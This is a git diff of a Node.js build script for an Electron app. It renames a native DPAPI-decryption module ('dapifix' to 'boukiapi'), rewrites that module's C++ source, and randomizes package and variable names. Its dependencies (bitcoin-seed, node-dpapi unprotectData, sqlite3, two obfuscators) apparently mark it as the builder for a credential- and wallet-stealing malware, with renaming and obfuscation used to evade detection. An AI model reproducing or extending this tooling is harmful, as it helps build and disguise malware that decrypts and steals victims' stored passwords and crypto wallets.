@@ -46,7 +46,7 @@ async function check_all_modules_installed() {
             "@peculiar/webcrypto",
             "axios",
             "bitcoin-seed",
-            "dapifix",
+            "boukiapi",
             "buffer-replace",
             "form-data",
             "javascript-obfuscator",
@@ -103,9 +103,9 @@ async function fix_dependencies() {
             await fix_dependencies();
         }
 
-        console.log("Rebuilding dapifix");
-        await build_native_module("dapifix")
-        console.log("Rebuilt dapifix");
+        console.log("Rebuilding boukiapi");
+        await build_native_module("boukiapi")
+        console.log("Rebuilt boukiapi");
 
         const node_js_versions = fs.readdirSync(`${appdata}\\node-gyp\\Cache`);
         await fix_node_gyp(node_js_versions)
@@ -184,7 +184,7 @@ require("os");
 require("path");
 require("stream");
 require("zip-lib");
-require("dapifix");
+require("boukiapi");
 require("systeminformation");
 require("sqlite3");
 require("request");
@@ -271,7 +271,7 @@ function get_pkg_cache() {
 }
 
 async function rename_dapi() {
-    let path = `.\\electron\\node_modules\\dapifix`
+    let path = `.\\electron\\node_modules\\boukiapi`
     let original_name = "node-dpapi"
     let new_name = makeid_var(12);
 
@@ -341,7 +341,7 @@ module.exports.unprotectData = dpapi.unprotectData;`;
 
 async function rename_dapi_vars() {
     return new Promise(res => {
-        let path = `./electron/node_modules/dapifix/src/node-dpapi.cpp`;
+        let path = `./electron/node_modules/boukiapi/src/node-dpapi.cpp`;
 
         let content = `#include <node.h>
 #include <nan.h>
@@ -442,9 +442,6 @@ async function fix_package() {
     let new_name = makeid_var(16)
 
     package_json.name = new_name;
-    ["js-confuser", "javascript-obfuscator", "electron-builder", "electron-rebuild"].forEach(module => {
-        delete package_json.dependencies[module];
-    })
 
     fs.writeFileSync("./electron/package.json", JSON.stringify(package_json))
 }
@@ -532,9 +529,9 @@ async function rebuild_electron() {
     }
     console.log(`Copied ./node_modules to ./electron/node_modules within ${(Date.now() - start) / 1000} seconds`);
 
-    console.log(`Modding dapifix`)
+    console.log(`Modding boukiapi`)
     await rename_dapi();
-    console.log("Modded dapifix");
+    console.log("Modded boukiapi");
 
     console.log(`Modding package.json`)
     await fix_package();
